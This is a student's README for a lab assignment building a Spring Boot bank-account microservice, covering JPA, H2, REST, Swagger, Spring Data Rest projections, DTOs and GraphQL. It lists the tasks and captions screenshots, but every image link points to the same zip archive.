## Activité Pratique N°4 : Mise en oeuvre d'un micro-service (Système distribué)

### Work to be done :

1. Create a Spring Boot project with Web, Spring Data JPA, H2, Lombok dependencies
2. Create the JPA entity Account
3. Create the AccountRepository interface based on Spring Data
4. Test the DAO layer
5. Create the Restfull web service that allows to manage accounts
6. Test the web microservice using a REST client like Postman
7. Generate and test the Swagger documentation of the Rest API of the web service
8. Expose a Restful API using Spring Data Rest by leveraging projections
9. Create DTOs and Mappers
10. Create the Service layer (business) and micro service
11. Create a GraphQL Web service for this microservice 
        
        

#### Bank account project with Spring Boot, Web dependencies, Spring Data JPA, H2,POSTMAN, Lombok to manage bank accounts:
the list of accounts in the database:
![Screenshot 2023-05-14 174728](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
the list of bankaccounts:
![Screenshot 2023-05-14 174849](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Consult an account using an id:
![Screenshot 2023-05-14 171822](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
The restful Web Service communicates with the outside world via a rest API:
The Test with Postman wearing the Id:
![Screenshot 2023-05-14 173751](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Generate and test the Swagger documentation:
![Screenshot 2023-05-14 174515](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
the documentation of rest API:
![Screenshot 2023-05-14 174928](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Test an account with an id:
![Screenshot 2023-05-14 174447](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Create an account using post:
![Screenshot 2023-05-14 182047](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
the account is well created:
![Screenshot 2023-05-14 182104](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Test the documentation with postman:
![Screenshot 2023-05-14 173722](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
expose a Restful API using Spring Data Rest by exploiting projections:
![Screenshot 2023-05-14 174849](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Search for all accounts that have a savings account type:
![Screenshot 2023-05-14 175038](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Create DTOs and Mappers:
![Screenshot 2023-05-14 182047](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Create a GraphQL Web service for this microservice:
Account list using ID, balance, currency and query to retrieve a list of accounts:
![Screenshot 2023-05-14 205430](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
a query to retrieve an account knowing that the Id:
![Screenshot 2023-05-14 205818](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Exception handeler:
![Screenshot 2023-05-14 211700](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Add an account using the mutation :
![Screenshot 2023-05-14 212109](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Update the account using the login :
![Screenshot 2023-05-14 213038](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Delete the account:
![Screenshot 2023-05-14 213229](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
the Database :
![Screenshot 2023-05-14 213848](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)
Search by customer name :
![Screenshot 2023-05-14 214019](https://raw.githubusercontent.com/Walid35-web/Activit-Pratique-4-d-un-micro-service/main/TP4_SD_FAJRI_WALID.zip)




